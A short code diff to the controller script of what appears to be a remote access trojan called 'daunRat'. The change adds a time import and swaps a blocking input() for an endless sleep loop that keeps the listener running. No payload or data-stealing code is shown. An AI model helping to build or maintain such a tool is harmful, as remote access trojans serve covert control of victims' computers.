@@ -6,6 +6,7 @@ from contextlib import redirect_stdout
 import subprocess
 import sys
 import os
+import time
 sys.path.append('daun/modules')
 import daun.modules as daun  # needed to use daun functionality from admin
 from modules.selfutil import daunrat  # needed to use self utility functions
@@ -84,4 +85,6 @@ if __name__ == '__main__':
     print("daunRat by ANONYMUSSSS")
     receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
     receiver.connect()
-    input()
+    while True:
+        time.sleep(3600)
+        print("daun rat is still running")
